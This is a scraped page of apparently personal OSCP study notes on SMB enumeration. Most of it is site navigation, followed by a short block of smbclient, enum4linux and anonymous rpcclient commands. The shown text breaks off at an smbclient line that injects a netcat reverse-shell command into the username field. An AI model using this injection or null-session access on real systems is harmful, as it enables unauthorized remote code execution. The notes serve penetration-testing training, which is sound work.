class="reset-3c756112--tooltipContainer-7fdb9b70--small-2ec8ae1a"><div class="reset-3c756112--avatarFrame-2f40cdc9--small-2ec8ae1a"><img class="image-67b14f24--avatar-1c1d03ec" src="https://gblobscdn.gitbook.com/spaces%2F-LkvnWByFHssLOYr3_77%2Favatar-1588689183922.png?alt=media"/></div></div><div class="reset-3c756112--S100Left-7c8af13a--logoDisplayNameContainer-583bfe61--logoText-716999b8"><span class="text-4505230f--DisplayH700-a03ad9b4--textContentFamily-49a318e1--spaceNameText-677c2969">OSCP</span></div></a></div><div class="reset-3c756112--desktopLogo-a594db90"><a class="link-a079aa82--primary-53a25e66--logoLink-10d08504" style="color:#df4945" href="../index.html"><div class="reset-3c756112--tooltipContainer-7fdb9b70--medium-296350e4"><div class="reset-3c756112--avatarFrame-2f40cdc9--medium-296350e4"><img class="image-67b14f24--avatar-1c1d03ec" src="https://gblobscdn.gitbook.com/spaces%2F-LkvnWByFHssLOYr3_77%2Favatar-1588689183922.png?alt=media"/></div></div><div class="reset-3c756112--S100Left-7c8af13a--logoDisplayNameContainer-583bfe61--logoText-716999b8"><span class="text-4505230f--DisplayH700-a03ad9b4--textContentFamily-49a318e1--spaceNameText-677c2969">OSCP</span></div></a></div></div><div role="button" tabindex="-1" class="reset-3c756112--mobileButton-7a76d05f"><svg preserveAspectRatio="xMidYMid meet" height="1em" width="1em" fill="none" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" stroke="currentColor" class="icon-7f6730be--text-3f89f380--icon-1f8349b3"><g><circle cx="10.5" cy="10.5" r="7.5"></circle><line x1="21" y1="21" x2="15.8" y2="15.8"></line></g></svg></div></div><div class="reset-3c756112--headerInnerWrapper-629f79d1--headerInnerWrapper-4f99acea"><div class="reset-3c756112--withScrollbar-39338630--scrollAxisX-bf86cd6c--headerInner-c872fc48"></div></div><div class="reset-3c756112--searchInputWrapper-ea7f3052--searchInputWrapper-0442d130"><div class="reset-3c756112--inputContainer-b2cb171c"><div aria-label="" class="reset-3c756112--inputWrapper-63396dac--TextH400-3033861f--medium-4505230f--light-502263b4--input-6d442051--searchInput-3fa812d5"><div class="reset-3c756112--inputInnerSizer-756c9114"><input type="text" placeholder="Search..." class="inputInner-5c86b87d--medium-0bbed4bd--inputInner-4216b016--searchInputPlaceholder-936306be"/></div><div class="reset-3c756112--inputAddOn-45de9ec1--inputAddOnPrefix-202fa60d--icon-1f8349b3"><svg preserveAspectRatio="xMidYMid meet" height="1em" width="1em" fill="none" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" stroke="currentColor" class="icon-7f6730be--text-3f89f380"><g><circle cx="10.5" cy="10.5" r="7.5"></circle><line x1="21" y1="21" x2="15.8" y2="15.8"></line></g></svg></div></div></div></div></div></div><div class="reset-3c756112--bodyContent-2f98451b"><div class="reset-3c756112--wholeContent-9fc567d4"><div class="reset-3c756112--wholeContentBody-554be184"><div role="presentation" class="reset-3c756112--backdrop-1322b68a--hidden-247382c3--overlay-29559ab8"></div><div class="reset-3c756112--contentNavigation-dd3370a4"><div class="reset-3c756112--contentNavigationInner-205d49ea--contentNavigationInnerCollapsed-7b4aca00"><div class="reset-3c756112--sidebarWrapper-84a13d8e"><div style="padding-bottom:0" class="reset-3c756112"></div><div class="reset-3c756112--sidebar-84a13d8e"><div class="reset-3c756112--navigationHeader-2c71cfec"><div class="reset-3c756112--navigationHeaderLogo-756c9114"><div class="reset-3c756112--mobileLogo-dacfd15c"><a class="link-a079aa82--primary-53a25e66--logoLink-10d08504" style="color:#df4945" href="../index.html"><div class="reset-3c756112--tooltipContainer-7fdb9b70--small-2ec8ae1a"><div class="reset-3c756112--avatarFrame-2f40cdc9--small-2ec8ae1a"><img class="image-67b14f24--avatar-1c1d03ec" src="https://gblobscdn.gitbook.com/spaces%2F-LkvnWByFHssLOYr3_77%2Favatar-1588689183922.png?alt=media"/></div></div><div class="reset-3c756112--S100Left-7c8af13a--logoDisplayNameContainer-583bfe61--logoText-716999b8"><span class="text-4505230f--DisplayH700-a03ad9b4--textContentFamily-49a318e1--spaceNameText-677c2969">OSCP</span></div></a></div><div class="reset-3c756112--desktopLogo-a594db90"><a class="link-a079aa82--primary-53a25e66--logoLink-10d08504" style="color:#df4945" href="../index.html"><div class="reset-3c756112--tooltipContainer-7fdb9b70--medium-296350e4"><div class="reset-3c756112--avatarFrame-2f40cdc9--medium-296350e4"><img class="image-67b14f24--avatar-1c1d03ec" src="https://gblobscdn.gitbook.com/spaces%2F-LkvnWByFHssLOYr3_77%2Favatar-1588689183922.png?alt=media"/></div></div><div class="reset-3c756112--S100Left-7c8af13a--logoDisplayNameContainer-583bfe61--logoText-716999b8"><span class="text-4505230f--DisplayH700-a03ad9b4--textContentFamily-49a318e1--spaceNameText-677c2969">OSCP</span></div></a></div></div><div class="reset-3c756112"><button class="button-36063075--medium-6e2a217a--button-d204befe--medium-54db2ab3"><span class="medium-3bde6db7--iconOnly-bddce91a"><svg preserveAspectRatio="xMidYMid meet" height="1em" width="1em" fill="none" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" stroke="currentColor" class="icon-7f6730be--text-3f89f380"><g><circle cx="10.5" cy="10.5" r="7.5"></circle><line x1="21" y1="21" x2="15.8" y2="15.8"></line></g></svg></span><span class="text-4505230f--UIH400-4e41e82a--textUIFamily-5ebd8e40--text-8ee2c8b2"></span></button></div></div><div class="reset-3c756112--sidebarMain-13701e8f--sidebarMainWithHeader-7d9d70ef"><div class="reset-3c756112--withScrollbar-39338630--scrollAxisY-7680295e--sidebarInner-18a1e7fe"><div class="reset-3c756112--mobileHeader-4e2d4892"><div role="button" tabindex="-1" class="reset-3c756112--mobileHeaderClose-47b8fa64"><svg preserveAspectRatio="xMidYMid meet" height="1em" width="1em" fill="none" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" stroke="currentColor" class="icon-7f6730be--text-3f89f380"><g><line x1="19" y1="12" x2="5" y2="12"></line><polyline points="12 19 5 12 12 5"></polyline></g></svg></div></div><div class="reset-3c756112--pagesTree-4b07cd56"><div class="reset-3c756112--pageItem-01e3f344"><div class="reset-3c756112--pageComponent-7cc5301a"><a class="navButton-94f2579c--navButtonClickable-161b88ca" href="../index.html"><span class="text-4505230f--UIH300-2063425d--textContentFamily-49a318e1--navButtonLabel-14a4968f">All About OSCP</span></a></div></div><div class="reset-3c756112"><div class="reset-3c756112--pageItemWithChildren-56f27afc"><div class="reset-3c756112"><div class="reset-3c756112--pageItem-01e3f344"><div class="reset-3c756112--pageComponent-7cc5301a"><a class="navButton-94f2579c--navButtonClickable-161b88ca" href="../one-page-methodology"><span class="text-4505230f--UIH300-2063425d--textContentFamily-49a318e1--navButtonLabel-14a4968f">OSCP- One Page Repository</span></a></div></div></div></div><div class="reset-3c756112--pageItemWithChildren-56f27afc"><div class="reset-3c756112"><div class="reset-3c756112--pageItem-01e3f344"><div class="reset-3c756112--pageComponent-7cc5301a"><a class="navButton-94f2579c--navButtonClickable-161b88ca" href="../about-the-author"><span class="text-4505230f--UIH300-2063425d--textContentFamily-49a318e1--navButtonLabel-14a4968f">About the Author</span></a></div></div></div></div><div class="reset-3c756112--pageItemWithChildren-56f27afc"><div class="reset-3c756112"><div class="reset-3c756112--pageItem-01e3f344"><div class="reset-3c756112--pageComponent-7cc5301a"><a class="navButton-94f2579c--navButtonClickable-161b88ca" href="../basic-linux-commands"><span class="text-4505230f--UIH300-2063425d--textContentFamily-49a318e1--navButtonLabel-14a4968f">Basic Linux &amp; Windows Commands</span><span class="reset-3c756112--navButtonIcon-433c72ce--navButtonIconClickable-11a89312" role="presentation"><svg preserveAspectRatio="xMidYMid meet" height="1em" width="1em" fill="none" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" stroke="currentColor" class="icon-7f6730be--text-3f89f380"><g><polyline points="9 18 15 12 9 6"></polyline></g></svg></span></a></div></div></div></div><div class="reset-3c756112--pageItemWithChildren-56f27afc"><div class="reset-3c756112"><div class="reset-3c756112--pageItem-01e3f344"><div class="reset-3c756112--pageComponent-7cc5301a"><a class="navButton-94f2579c--navButtonClickable-161b88ca" href="../untitled"><span class="text-4505230f--UIH300-2063425d--textContentFamily-49a318e1--navButtonLabel-14a4968f">Recon (Scanning &amp; Enumeration)</span><span class="reset-3c756112--navButtonIcon-433c72ce--navButtonIconClickable-11a89312" role="presentation"><svg preserveAspectRatio="xMidYMid meet" height="1em" width="1em" fill="none" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" stroke="currentColor" class="icon-7f6730be--text-3f89f380--pageDocumentIconExpanded-014d853c"><g><polyline points="9 18 15 12 9 6"></polyline></g></svg></span></a></div></div></div><div class="reset-3c756112--pageChildren-56f27afc--pageDocumentChildren-2add00e7"><div class="reset-3c756112"><div class="reset-3c756112--pageItemWithChildren-56f27afc"><div class="reset-3c756112"><div class="reset-3c756112--pageItem-01e3f344"><div class="reset-3c756112--pageComponent-7cc5301a"><a class="navButton-94f2579c--pageItemWithChildrenNested-2c5d8183--navButtonClickable-161b88ca" href="active-info-gathering"><span class="text-4505230f--UIH300-2063425d--textContentFamily-49a318e1--navButtonLabel-14a4968f">Active Info Gathering</span><span class="reset-3c756112--navButtonIcon-433c72ce--navButtonIconClickable-11a89312" role="presentation"><svg preserveAspectRatio="xMidYMid meet" height="1em" width="1em" fill="none" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" stroke="currentColor" class="icon-7f6730be--text-3f89f380"><g><polyline points="9 18 15 12 9 6"></polyline></g></svg></span></a></div></div></div></div><div class="reset-3c756112--pageItemWithChildren-56f27afc"><div class="reset-3c756112"><div class="reset-3c756112--pageItem-01e3f344"><div class="reset-3c756112--pageComponent-7cc5301a"><a class="navButton-94f2579c--pageItemWithChildrenNested-2c5d8183--navButtonClickable-161b88ca" href="common-ports-and-services"><span class="text-4505230f--UIH300-2063425d--textContentFamily-49a318e1--navButtonLabel-14a4968f">Common Ports and Services</span><span class="reset-3c756112--navButtonIcon-433c72ce--navButtonIconClickable-11a89312" role="presentation"><svg preserveAspectRatio="xMidYMid meet" height="1em" width="1em" fill="none" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" stroke="currentColor" class="icon-7f6730be--text-3f89f380"><g><polyline points="9 18 15 12 9 6"></polyline></g></svg></span></a></div></div></div></div><div class="reset-3c756112--pageItemWithChildren-56f27afc"><div class="reset-3c756112"><div class="reset-3c756112--pageItem-01e3f344"><div class="reset-3c756112--pageComponent-7cc5301a"><a class="navButton-94f2579c--pageItemWithChildrenNested-2c5d8183--navButtonClickable-161b88ca" href="dns-zone-transfer-attack"><span class="text-4505230f--UIH300-2063425d--textContentFamily-49a318e1--navButtonLabel-14a4968f">DNS Zone Transfer Attack</span></a></div></div></div></div><div class="reset-3c756112--pageItemWithChildren-56f27afc"><div class="reset-3c756112"><div class="reset-3c756112--pageItem-01e3f344"><div class="reset-3c756112--pageComponent-7cc5301a"><a class="navButton-94f2579c--pageItemWithChildrenNested-2c5d8183--navButtonClickable-161b88ca" href="snmp-enumeration"><span class="text-4505230f--UIH300-2063425d--textContentFamily-49a318e1--navButtonLabel-14a4968f">SNMP Enumeration</span></a></div></div></div></div><div class="reset-3c756112--pageItemWithChildren-56f27afc"><div class="reset-3c756112"><div class="reset-3c756112--pageItem-01e3f344"><div class="reset-3c756112--pageComponent-7cc5301a"><a class="navButton-94f2579c--pageItemWithChildrenNested-2c5d8183--navButtonClickable-161b88ca--navButtonOpened-6a88552e" style="color:#df4945" href="smb-enumeration"><span class="text-4505230f--UIH300-2063425d--textContentFamily-49a318e1--navButtonLabel-14a4968f">SMB Enumeration</span></a></div></div></div></div><div class="reset-3c756112--pageItemWithChildren-56f27afc"><div class="reset-3c756112"><div class="reset-3c756112--pageItem-01e3f344"><div class="reset-3c756112--pageComponent-7cc5301a"><a class="navButton-94f2579c--pageItemWithChildrenNested-2c5d8183--navButtonClickable-161b88ca" href="web-application-fingerprinting"><span class="text-4505230f--UIH300-2063425d--textContentFamily-49a318e1--navButtonLabel-14a4968f">Web Application Directory bruteforcing / fingerprinting</span></a></div></div></div></div><div class="reset-3c756112--pageItemWithChildren-56f27afc"><div class="reset-3c756112"><div class="reset-3c756112--pageItem-01e3f344"><div class="reset-3c756112--pageComponent-7cc5301a"><a class="navButton-94f2579c--pageItemWithChildrenNested-2c5d8183--navButtonClickable-161b88ca" href="port-and-services-scanning"><span class="text-4505230f--UIH300-2063425d--textContentFamily-49a318e1--navButtonLabel-14a4968f">Port &amp; Services Scanning</span></a></div></div></div></div></div></div></div><div class="reset-3c756112--pageItemWithChildren-56f27afc"><div class="reset-3c756112"><div class="reset-3c756112--pageItem-01e3f344"><div class="reset-3c756112--pageComponent-7cc5301a"><a class="navButton-94f2579c--navButtonClickable-161b88ca" href="../web-application"><span class="text-4505230f--UIH300-2063425d--textContentFamily-49a318e1--navButtonLabel-14a4968f">Web Application</span><span class="reset-3c756112--navButtonIcon-433c72ce--navButtonIconClickable-11a89312" role="presentation"><svg preserveAspectRatio="xMidYMid meet" height="1em" width="1em" fill="none" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" stroke="currentColor" class="icon-7f6730be--text-3f89f380"><g><polyline points="9 18 15 12 9 6"></polyline></g></svg></span></a></div></div></div></div><div class="reset-3c756112--pageItemWithChildren-56f27afc"><div class="reset-3c756112"><div class="reset-3c756112--pageItem-01e3f344"><div class="reset-3c756112--pageComponent-7cc5301a"><a class="navButton-94f2579c--navButtonClickable-161b88ca" href="../brute-force"><span class="text-4505230f--UIH300-2063425d--textContentFamily-49a318e1--navButtonLabel-14a4968f">Brute Force</span><span class="reset-3c756112--navButtonIcon-433c72ce--navButtonIconClickable-11a89312" role="presentation"><svg preserveAspectRatio="xMidYMid meet" height="1em" width="1em" fill="none" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" stroke="currentColor" class="icon-7f6730be--text-3f89f380"><g><polyline points="9 18 15 12 9 6"></polyline></g></svg></span></a></div></div></div></div><div class="reset-3c756112--pageItemWithChildren-56f27afc"><div class="reset-3c756112"><div class="reset-3c756112--pageItem-01e3f344"><div class="reset-3c756112--pageComponent-7cc5301a"><a class="navButton-94f2579c--navButtonClickable-161b88ca" href="../shells"><span class="text-4505230f--UIH300-2063425d--textContentFamily-49a318e1--navButtonLabel-14a4968f">Shells</span><span class="reset-3c756112--navButtonIcon-433c72ce--navButtonIconClickable-11a89312" role="presentation"><svg preserveAspectRatio="xMidYMid meet" height="1em" width="1em" fill="none" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" stroke="currentColor" class="icon-7f6730be--text-3f89f380"><g><polyline points="9 18 15 12 9 6"></polyline></g></svg></span></a></div></div></div></div><div class="reset-3c756112--pageItemWithChildren-56f27afc"><div class="reset-3c756112"><div class="reset-3c756112--pageItem-01e3f344"><div class="reset-3c756112--pageComponent-7cc5301a"><a class="navButton-94f2579c--navButtonClickable-161b88ca" href="../transferring-files"><span class="text-4505230f--UIH300-2063425d--textContentFamily-49a318e1--navButtonLabel-14a4968f">Transferring files</span><span class="reset-3c756112--navButtonIcon-433c72ce--navButtonIconClickable-11a89312" role="presentation"><svg preserveAspectRatio="xMidYMid meet" height="1em" width="1em" fill="none" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" stroke="currentColor" class="icon-7f6730be--text-3f89f380"><g><polyline points="9 18 15 12 9 6"></polyline></g></svg></span></a></div></div></div></div><div class="reset-3c756112--pageItemWithChildren-56f27afc"><div class="reset-3c756112"><div class="reset-3c756112--pageItem-01e3f344"><div class="reset-3c756112--pageComponent-7cc5301a"><a class="navButton-94f2579c--navButtonClickable-161b88ca" href="../priv-escalation"><span class="text-4505230f--UIH300-2063425d--textContentFamily-49a318e1--navButtonLabel-14a4968f">Priv Escalation</span><span class="reset-3c756112--navButtonIcon-433c72ce--navButtonIconClickable-11a89312" role="presentation"><svg preserveAspectRatio="xMidYMid meet" height="1em" width="1em" fill="none" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" stroke="currentColor" class="icon-7f6730be--text-3f89f380"><g><polyline points="9 18 15 12 9 6"></polyline></g></svg></span></a></div></div></div></div><div class="reset-3c756112--pageItemWithChildren-56f27afc"><div class="reset-3c756112"><div class="reset-3c756112--pageItem-01e3f344"><div class="reset-3c756112--pageComponent-7cc5301a"><a class="navButton-94f2579c--navButtonClickable-161b88ca" href="../post-exploitation"><span class="text-4505230f--UIH300-2063425d--textContentFamily-49a318e1--navButtonLabel-14a4968f">Post Exploitation</span><span class="reset-3c756112--navButtonIcon-433c72ce--navButtonIconClickable-11a89312" role="presentation"><svg preserveAspectRatio="xMidYMid meet" height="1em" width="1em" fill="none" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" stroke="currentColor" class="icon-7f6730be--text-3f89f380"><g><polyline points="9 18 15 12 9 6"></polyline></g></svg></span></a></div></div></div></div><div class="reset-3c756112--pageItemWithChildren-56f27afc"><div class="reset-3c756112"><div class="reset-3c756112--pageItem-01e3f344"><div class="reset-3c756112--pageComponent-7cc5301a"><a class="navButton-94f2579c--navButtonClickable-161b88ca" href="../pivoting"><span class="text-4505230f--UIH300-2063425d--textContentFamily-49a318e1--navButtonLabel-14a4968f">Pivoting</span><span class="reset-3c756112--navButtonIcon-433c72ce--navButtonIconClickable-11a89312" role="presentation"><svg preserveAspectRatio="xMidYMid meet" height="1em" width="1em" fill="none" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" stroke="currentColor" class="icon-7f6730be--text-3f89f380"><g><polyline points="9 18 15 12 9 6"></polyline></g></svg></span></a></div></div></div></div><div class="reset-3c756112--pageItemWithChildren-56f27afc"><div class="reset-3c756112"><div class="reset-3c756112--pageItem-01e3f344"><div class="reset-3c756112--pageComponent-7cc5301a"><a class="navButton-94f2579c--navButtonClickable-161b88ca" href="../buffer-overflow"><span class="text-4505230f--UIH300-2063425d--textContentFamily-49a318e1--navButtonLabel-14a4968f">Buffer Overflow</span><span class="reset-3c756112--navButtonIcon-433c72ce--navButtonIconClickable-11a89312" role="presentation"><svg preserveAspectRatio="xMidYMid meet" height="1em" width="1em" fill="none" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" stroke="currentColor" class="icon-7f6730be--text-3f89f380"><g><polyline points="9 18 15 12 9 6"></polyline></g></svg></span></a></div></div></div></div><div class="reset-3c756112--pageItemWithChildren-56f27afc"><div class="reset-3c756112"><div class="reset-3c756112--pageItem-01e3f344"><div class="reset-3c756112--pageComponent-7cc5301a"><a class="navButton-94f2579c--navButtonClickable-161b88ca" href="../main-tools"><span class="text-4505230f--UIH300-2063425d--textContentFamily-49a318e1--navButtonLabel-14a4968f">Main Tools</span></a></div></div></div></div><div class="reset-3c756112--pageItemWithChildren-56f27afc"><div class="reset-3c756112"><div class="reset-3c756112--pageItem-01e3f344"><div class="reset-3c756112--pageComponent-7cc5301a"><a class="navButton-94f2579c--navButtonClickable-161b88ca" href="../misc"><span class="text-4505230f--UIH300-2063425d--textContentFamily-49a318e1--navButtonLabel-14a4968f">MISC</span><span class="reset-3c756112--navButtonIcon-433c72ce--navButtonIconClickable-11a89312" role="presentation"><svg preserveAspectRatio="xMidYMid meet" height="1em" width="1em" fill="none" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" stroke="currentColor" class="icon-7f6730be--text-3f89f380"><g><polyline points="9 18 15 12 9 6"></polyline></g></svg></span></a></div></div></div></div><div class="reset-3c756112--pageItemWithChildren-56f27afc"><div class="reset-3c756112"><div class="reset-3c756112--pageItem-01e3f344"><div class="reset-3c756112--pageComponent-7cc5301a"><a class="navButton-94f2579c--navButtonClickable-161b88ca" href="../cheatsheet-short"><span class="text-4505230f--UIH300-2063425d--textContentFamily-49a318e1--navButtonLabel-14a4968f">CheatSheet (Short)</span></a></div></div></div></div><div class="reset-3c756112--pageItemWithChildren-56f27afc--S300Bottom-9b4658d2"><div class="reset-3c756112"><div class="reset-3c756112--pageItem-01e3f344"><div class="reset-3c756112--pageComponent-7cc5301a"><a class="navButton-94f2579c--navButtonClickable-161b88ca" href="../htb-learning"><span class="text-4505230f--UIH300-2063425d--textContentFamily-49a318e1--navButtonLabel-14a4968f">OSCP/ Vulnhub Practice learning</span><span class="reset-3c756112--navButtonIcon-433c72ce--navButtonIconClickable-11a89312" role="presentation"><svg preserveAspectRatio="xMidYMid meet" height="1em" width="1em" fill="none" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" stroke="currentColor" class="icon-7f6730be--text-3f89f380"><g><polyline points="9 18 15 12 9 6"></polyline></g></svg></span></a></div></div></div></div></div></div></div><div class="reset-3c756112--footer-68e6f18c"><a href="https://www.gitbook.com/?utm_source=content&amp;utm_medium=trademark&amp;utm_campaign=infosecsanyam261" target="_blank" class="reset-3c756112--trademark-a8da4b94" role="presentation"><div class="reset-3c756112--trademarkLogo-0d2d53bc"><svg preserveAspectRatio="xMidYMid meet" height="1em" width="1em" fill="currentColor" viewBox="0 0 1067 769" xmlns="http://www.w3.org/2000/svg" stroke="none" class="icon-7f6730be--text-3f89f380"><g><path d="M480.026 640.677c17.205 0 31.2 13.997 31.2 31.194s-13.995 31.193-31.2 31.193c-17.197 0-31.193-13.996-31.193-31.193 0-17.197 13.996-31.194 31.193-31.194m489.93-193.226c-17.203 0-31.2-13.998-31.2-31.195 0-17.204 13.997-31.2 31.2-31.2 17.198 0 31.194 13.996 31.194 31.2 0 17.197-13.996 31.195-31.193 31.195m0-127.804c-53.269 0-96.609 43.34-96.609 96.609 0 10.373 1.723 20.702 5.123 30.741L559.328 616.879c-18.132-26.128-47.521-41.617-79.302-41.617-36.821 0-70.391 21.065-86.63 54.003L106.68 478.109c-30.288-15.927-52.965-65.817-50.56-111.223 1.248-23.687 9.438-42.071 21.897-49.17 7.916-4.493 17.436-4.099 27.526 1.188l1.916 1.01c75.96 40.022 324.6 170.981 335.063 175.844 16.157 7.47 25.14 10.5 52.659-2.547l513.958-267.3c7.53-2.844 16.315-10.062 16.315-21.023 0-15.205-15.72-21.199-15.765-21.199-29.218-14.018-74.163-35.054-117.987-55.57C798.033 84.26 691.861 34.547 645.23 10.132c-40.253-21.072-72.655-3.311-78.432.282l-11.227 5.555C345.727 119.743 64.898 258.826 48.911 268.553 20.278 285.973 2.547 320.679.252 363.768c-3.586 68.304 31.261 139.506 81.069 165.634l303.172 156.354c6.83 47.306 47.55 82.725 95.532 82.725 52.78 0 95.808-42.546 96.603-95.14L910.541 492.38c16.93 13.233 37.92 20.486 59.416 20.486 53.268 0 96.61-43.341 96.61-96.61s-43.342-96.61-96.61-96.61" fill-rule="evenodd"></path></g></svg></div><div class="reset-3c756112--trademarkContent-04a01aea"><div class="reset-3c756112"><span class="text-4505230f--TextH200-a3425406--textUIFamily-5ebd8e40">Powered by <b>GitBook</b></span></div></div></a></div></div></div></div></div></div><div class="reset-3c756112--wholeContentPage-6c3f1fc5"><div class="reset-3c756112--wholePageSticky-f53dafd2"><div class="reset-3c756112--pageContainer-544d6e9c"><div class="reset-3c756112"><div class="reset-3c756112--pageHeader-15724735"><div class="reset-3c756112--pageHeaderInner-7c0f0284"><div class="reset-3c756112--pageHeaderWrapperContent-6897c946"><div class="reset-3c756112--horizontalFlex-5a0077e0"><div class="reset-3c756112--pageHeaderIntro-0c1463da"><h1 class="reset-3c756112--pageTitle-33dc39a3"><span class="text-4505230f--DisplayH900-bfb998fa--textContentFamily-49a318e1">SMB Enumeration</span></h1></div><div style="grid-template-columns:repeat(1, auto)" class="reset-3c756112--toolbar-a6a9f7d2--medium-8e46b02c--pageHeaderToolbar-6457a802--withControlsClosed-3e96e46c"><button class="button-36063075--small-30ceeddb--button-d204befe--small-54db2a94"><span class="small-3bde6db7--iconOnly-bddce91a"><svg preserveAspectRatio="xMidYMid meet" height="1em" width="1em" fill="none" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" stroke="currentColor" class="icon-7f6730be--text-3f89f380"><g><line x1="21" y1="10" x2="7" y2="10"></line><line x1="21" y1="6" x2="3" y2="6"></line><line x1="21" y1="14" x2="3" y2="14"></line><line x1="21" y1="18" x2="7" y2="18"></line></g></svg></span><span class="text-4505230f--UIH300-2063425d--textUIFamily-5ebd8e40--text-8ee2c8b2"></span></button></div></div><div class="reset-3c756112--pageHeaderDescription-22970244"></div></div></div></div><div class="reset-3c756112--toaster-c029690e"></div><div class="reset-3c756112--pageBody-a91db4ac"><div data-editioncontainer="true" class="reset-3c756112--container-960c7c26"><div data-slate-editor="true" data-key="4" autoCorrect="on" spellcheck="true" data-gramm="false" style="outline:none;white-space:pre-wrap;word-wrap:break-word"><h2 id="smb-tools" class="blockHeading-442b4f12" data-key="2"><div class="blockHeadingContent-756c9114"><span class="text-4505230f--HeadingH600-23f228db--textContentFamily-49a318e1"><span data-key="1"><span data-offset-key="1:0">SMB Tools</span></span></span><a href="smb-enumeration#smb-tools" contenteditable="false" class="blockHeadingAnchor-34f75d78--blockHeadingAnchorHidden-d69b5eda"><span class="blockHeadingAnchorIcon-1c2bf3cb"><svg preserveAspectRatio="xMidYMid meet" height="1em" width="1em" fill="none" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" stroke="currentColor" class="icon-7f6730be--text-3f89f380"><g><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></g></svg></span></a></div></h2><div class="reset-3c756112--codeBlockWrapper-56f27afc"><div contenteditable="false" class="reset-3c756112--copyButtonWrapper-ca591f6e"><div aria-label="Copy" role="button" tabindex="0" class="reset-3c756112--touchableView-a079aa82--copyButton-4f9a9412--tooltipped-57ae51fe"><svg preserveAspectRatio="xMidYMid meet" height="1em" width="1em" fill="none" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" stroke="currentColor" class="icon-7f6730be--text-3f89f380"><g><rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path></g></svg></div></div><pre data-key="4fc4e2691ae9490ca5038de0f6f76cff" spellcheck="false" class="reset-3c756112--codeBlock-36378b66"><div class="codeLine-a3169fbc" data-key="3fe2e6ebe0754f18b8575740c703ecb4"><span data-key="e8e35788e5cc467bad241cdb8e64a916"><span data-offset-key="e8e35788e5cc467bad241cdb8e64a916:0">smbclient -L x.x.x.x</span></span></div><div class="codeLine-a3169fbc" data-key="4b8558fde8ac419a98b0569823260e6f"><span data-key="7ebf9e8053d24635b03091b8d5972ab8"><span data-offset-key="7ebf9e8053d24635b03091b8d5972ab8:0">smbmount //x.x.x.x/share /mnt –o username=hodor,workgroup=hodor</span></span></div><div class="codeLine-a3169fbc" data-key="a5bf908ff9af4bb9a06391ebd1c5fd6a"><span data-key="10fa5220e812441c855ec5702d3878c3"><span data-offset-key="10fa5220e812441c855ec5702d3878c3:0">smbclient \\\\x.x.x.x\\share</span></span></div><div class="codeLine-a3169fbc" data-key="d67f43926a014dc89bf6e5d0c631fe99"><span data-key="93b278179efd4d4da9b0529d339bf054"><span data-offset-key="93b278179efd4d4da9b0529d339bf054:0">enum4linux -a ip</span></span></div><div class="codeLine-a3169fbc" data-key="9a674a507bb44704800828b44c1b5150"><span data-key="1d808fc7397c4f928486dc58e28c9425"><span data-offset-key="1d808fc7397c4f928486dc58e28c9425:0">rpcclient -U &quot;&quot; x.x.x.x  #Anonymous bind using rpcclient / Null connect</span></span></div><div class="codeLine-a3169fbc" data-key="defc71970e1a47d58e1a58e6d54c91ba"><span data-key="f5dcd336daf9448abd85eeeb8e461f3a"><span data-offset-key="f5dcd336daf9448abd85eeeb8e461f3a:0">smbclient //MOUNT/share #Connect to SMB share</span></span></div><div class="codeLine-a3169fbc" data-key="3a08399f481f4499ad533d395329ef4b"><span data-key="bebfcd1417c7465b8ff0ee549288ee0b"><span data-offset-key="bebfcd1417c7465b8ff0ee549288ee0b:0"><span data-slate-zero-width="n">​</span></span></span></div><div class="codeLine-a3169fbc" data-key="da588fea307e49baa87dbddd47aa3432"><span data-key="eb28cbe4d9284eb29efedb5de7cda56e"><span data-offset-key="eb28cbe4d9284eb29efedb5de7cda56e:0">smbclient -U &quot;/=&amp;#92;&amp;#96;nohup nc -e /bin/sh LHOST LPORT&amp;#92;&amp;#96;&quot; -N -I ip 